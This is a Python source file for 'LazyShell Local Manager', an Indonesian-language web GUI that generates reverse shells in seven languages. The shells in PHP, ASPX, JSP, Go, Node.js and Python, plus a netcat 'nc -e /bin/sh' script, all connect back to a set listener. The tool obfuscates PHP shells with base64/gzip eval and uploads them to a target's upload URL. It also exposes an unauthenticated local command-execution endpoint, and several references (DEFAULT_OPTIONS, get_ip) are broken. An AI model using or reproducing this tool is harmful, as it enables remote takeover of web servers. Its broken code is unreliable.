# lazyshell_local_manager.py
import http.server
import socketserver
import urllib.parse
import os
import base64
import zlib
import threading
import webbrowser
import json
from pathlib import Path

PORT = 8000
DIRECTORY = "."
OPTIONS_FILE = "lazyshell_options.json"

# === DEFAULT OPTIONS ===
OPTIONS = {
    "LHOST": {"value": "192.168.1.100", "required": True, "desc": "Listener IP"},
    "LPORT": {"value": 4444, "required": True, "desc": "Listener port"},
    "TYPE": {"value": "php", "required": True, "desc": "Shell type", "choices": ["php", "aspx", "jsp", "go", "nodejs", "python", "netcat"]},
    "FILENAME": {"value": "shell", "required": False, "desc": "Output filename"},
    "OBFUSCATE": {"value": "yes", "required": False, "desc": "Obfuscate PHP?", "choices": ["yes", "no"]}
}

# === LOAD / SAVE OPTIONS ===
def load_options():
    if Path(OPTIONS_FILE).exists():
        return json.loads(Path(OPTIONS_FILE).read_text())
    return DEFAULT_OPTIONS.copy()

def save_options(opts):
    Path(OPTIONS_FILE).write_text(json.dumps(opts, indent=2))

# === OBFUSCATOR ===
def obfuscate(code):
    return '<?php eval(gzuncompress(base64_decode("' + base64.b64encode(zlib.compress(code.encode())).decode() + '"))); ?>'

# === SHELL TEMPLATES ===
SHELLS = {
    "php": '<?php set_time_limit(0); $s=fsockopen("{LHOST}",{LPORT}); $p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$pipes); ?>',
    "aspx": '<%@ Page Language="C#" %><script runat="server">void Page_Load(){System.Net.Sockets.TcpClient c=new System.Net.Sockets.TcpClient("{LHOST}",{LPORT});System.IO.Stream s=c.GetStream();System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.Start();byte[] b=new byte[1024];while(true){int r=s.Read(b,0,b.Length);if(r<=0)break;string cmd=System.Text.Encoding.ASCII.GetString(b,0,r);p.StandardInput.WriteLine(cmd);}}</script>',
    "jsp": '<%@page import="java.io.*,java.net.*"%><% Socket s=new Socket("{LHOST}",{LPORT}); Process p=Runtime.getRuntime().exec("cmd.exe"); InputStream pi=p.getInputStream(), si=s.getInputStream(); OutputStream po=p.getOutputStream(), so=s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); } %>',
    "go": '#!/usr/bin/env go run $0; exit $?' + "\n" + 'package main; import "net"; import "os/exec"; func main(){ c,_:=net.Dial("tcp","{LHOST}:{LPORT}"); cmd:=exec.Command("/bin/sh"); cmd.Stdin, cmd.Stdout, cmd.Stderr = c,c,c; cmd.Run()}',
    "nodejs": 'const net=require("net"),cp=require("child_process");const client=new net.Socket();client.connect({LPORT},"{LHOST}",()=>{const sh=cp.spawn("/bin/sh",[]);client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});',
    "python": '#!/usr/bin/python3\nimport socket,subprocess,os\ns=socket.socket();s.connect(("{LHOST}",{LPORT}))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])',
    "netcat": '#!/bin/bash\nnc -e /bin/sh {LHOST} {LPORT}'
}

# === HTML GUI DENGAN OPTIONS ===
HTML = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>LAZYSHELL LOCAL MANAGER</title>
  <style>
    :root { --bg:#000; --red:#f00; --dark:#111; --glow:#f00; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:var(--bg); color:var(--red); font-family:'Courier New'; overflow-x:hidden; }
    .container { padding:2rem; max-width:1200px; margin:auto; }
    .header { text-align:center; margin:2rem 0; animation:pulse 2s infinite; }
    .header h1 { font-size:3rem; text-shadow:0 0 20px var(--glow); letter-spacing:5px; }
    .card { background:var(--dark); border:2px solid var(--red); border-radius:12px; padding:1.5rem; margin:1rem 0; box-shadow:0 0 20px rgba(255,0,0,0.5); }
    input, select, button, textarea { width:100%; padding:1rem; margin:0.5rem 0; background:#000; color:var(--red); border:1px solid var(--red); border-radius:8px; }
    button { background:var(--red); color:#000; font-weight:bold; cursor:pointer; }
    button:hover { background:#fff; color:#f00; box-shadow:0 0 20px var(--glow); }
    .terminal { background:#000; color:#0f0; height:300px; overflow-y:auto; padding:1rem; border:1px solid var(--red); border-radius:8px; white-space:pre-wrap; }
    .input-line { display:flex; }
    .input-line input { flex:1; border:none; background:transparent; color:#0f0; outline:none; }
    .input-line::before { content:"> "; color:#0f0; }
    .glow { text-shadow:0 0 10px var(--glow); animation:flicker 1.5s infinite alternate; }
    table { width:100%; border-collapse:collapse; margin:1rem 0; }
    th, td { padding:0.8rem; border:1px solid var(--red); text-align:left; }
    th { background:#200; }
    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
    @keyframes flicker { 0%,100% { opacity:1; } 50% { opacity:0.8; } }
    .file-item { display:flex; justify-content:space-between; padding:0.5rem; background:#111; margin:0.3rem 0; border-left:4px solid var(--red); }
  </style>
</head>
<body>
<div class="container">
  <div class="header glow">
    <h1>LAZYSHELL LOCAL</h1>
    <p>OBFUSCATE • GENERATE • DOMINATE</p>
  </div>

  <!-- OPTIONS TABLE -->
  <div class="card">
    <h2 class="glow">Module Options</h2>
    <form method="post" action="/set">
      <table>
        <tr><th>Name</th><th>Value</th><th>Required</th><th>Description</th></tr>
        {OPTIONS_TABLE}
      </table>
      <button type="submit">UPDATE OPTIONS</button>
    </form>
    <form method="post" action="/reset"><button type="submit" style="margin-top:0.5rem;">RESET TO DEFAULT</button></form>
  </div>

  <!-- GENERATE -->
  <div class="card">
    <h2 class="glow">Generate Shell</h2>
    <form method="post" action="/generate">
      <button type="submit" style="width:100%;padding:1.5rem;font-size:1.2rem;">RUN → GENERATE + OBFUSCATE</button>
    </form>
  </div>

  <!-- UPLOAD -->
  <div class="card">
    <h2 class="glow">Upload to Target</h2>
    <form method="post" action="/upload" enctype="multipart/form-data">
      <input type="file" name="file" required>
      <input name="url" placeholder="http://target.com/upload.php">
      <button type="submit">UPLOAD NOW</button>
    </form>
  </div>

  <!-- GENERATED SHELLS -->
  <div class="card">
    <h2 class="glow">Generated Shells</h2>
    <div id="files">{FILES}</div>
  </div>

  <!-- TERMINAL -->
  <div class="card">
    <h2 class="glow">Terminal (Local)</h2>
    <div class="terminal" id="term">LAZYSHELL READY...</div>
    <div class="input-line"><input id="cmd" placeholder="whoami" onkeypress="if(event.key==='Enter')run()"></div>
  </div>
</div>

<script>
function run() {
    const cmd = document.getElementById('cmd').value;
    if (!cmd) return;
    const term = document.getElementById('term');
    term.innerHTML += `\\n> ${cmd}\\n`;
    fetch(`/cmd?cmd=${encodeURIComponent(cmd)}`)
        .then(r => r.text())
        .then(out => { term.innerHTML += out; term.scrollTop = term.scrollHeight; });
    document.getElementById('cmd').value = '';
}
</script>
</body>
</html>
'''

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.options = load_options()
        super().__init__(*args, **kwargs)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()

            # Build options table
            table_rows = ""
            for name, opt in self.options.items():
                val = opt["value"]
                req = "yes" if opt.get("required") else "no"
                desc = opt["desc"]
                if "choices" in opt:
                    choices = "".join([f"<option value='{c}'>{c}</option>" for c in opt["choices"]])
                    input_field = f"<select name='{name}'>{choices}</select>"
                else:
                    input_field = f"<input name='{name}' value='{val}'>"
                table_rows += f"<tr><td>{name}</td><td>{input_field}</td><td>{req}</td><td>{desc}</td></tr>"

            # List files
            files = ""
            for f in Path(".").glob("*.*"):
                if f.suffix in [".php", ".aspx", ".jsp", ".cgi", ".js", ".py", ".sh"]:
                    files += f'<div class="file-item"><span>{f.name}</span><div><a href="/{f.name}" download>Download</a> | <a href="/delete?file={f.name}">Delete</a></div></div>'

            html = HTML.replace("{OPTIONS_TABLE}", table_rows).replace("{FILES}", files)
            self.wfile.write(html.encode())

        elif parsed.path == "/cmd":
            cmd = urllib.parse.parse_qs(parsed.query).get("cmd", [""])[0]
            import subprocess
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
            except Exception as e:
                out = str(e)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(out.encode())

        elif parsed.path == "/delete":
            file = urllib.parse.parse_qs(parsed.query).get("file", [""])[0]
            try:
                Path(file).unlink()
            except: pass
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

        else:
            super().do_GET()

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        length = int(self.headers.get('content-length', 0))
        body = self.rfile.read(length).decode()

        if parsed.path == "/set":
            data = urllib.parse.parse_qs(body)
            for k, v in data.items():
                if k in self.options:
                    self.options[k]["value"] = v[0] if isinstance(v, list) else v
            save_options(self.options)
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

        elif parsed.path == "/reset":
            self.options = DEFAULT_OPTIONS.copy()
            save_options(self.options)
            self.send_response(301)
            self.send_header("Location", "/")
            self.end_headers()

        elif parsed.path == "/generate":
            lhost = self.options["LHOST"]["value"]
            lport = self.options["LPORT"]["value"]
            shell_type = self.options["TYPE"]["value"]
            filename = self.options["FILENAME"]["value"]
            obfuscate = self.options["OBFUSCATE"]["value"] == "yes"

            if shell_type not in SHELLS:
                msg = "Invalid TYPE"
            else:
                code = SHELLS[shell_type].replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
                if obfuscate and shell_type == "php":
                    code = obfuscate(code)
                ext = "cgi" if shell_type == "go" else ("sh" if shell_type == "netcat" else shell_type)
                final_name = f"{filename}.{ext}"
                Path(final_name).write_text(code)
                if ext in ["py", "sh", "cgi"]:
                    Path(final_name).chmod(0o755)
                msg = f"Generated: {final_name}"

            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"<script>alert('{msg}'); location='/';</script>".encode())

        elif parsed.path == "/upload":
            import cgi, requests
            form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
            fileitem = form['file']
            url = form.getvalue('url')
            if fileitem.file:
                files = {'file': (fileitem.filename, fileitem.file.read())}
                try:
                    r = requests.post(url, files=files, timeout=10)
                    msg = r.text[:100]
                except Exception as e:
                    msg = str(e)
            else:
                msg = "No file"
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(f"<script>alert('UPLOAD: {msg}'); location='/';</script>".encode())

# === SERVER ===
def start_server():
    os.chdir(DIRECTORY)
    handler = lambda *args: Handler(*args, directory=DIRECTORY)
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        ip = Handler().get_ip()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                  LAZYSHELL LOCAL MANAGER                     ║
║  URL: http://127.0.0.1:{PORT}                                ║
║  IP:  http://{ip}:{PORT}                                     ║
║                                                              ║
║  [✓] show options  → di browser                              ║
║  [✓] set LHOST     → langsung di form                        ║
║  [✓] run           → klik tombol RUN                         ║
╚══════════════════════════════════════════════════════════════╝
        """)
        webbrowser.open(f"http://127.0.0.1:{PORT}")
        httpd.serve_forever()

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    input("Tekan ENTER untuk stop...\n")
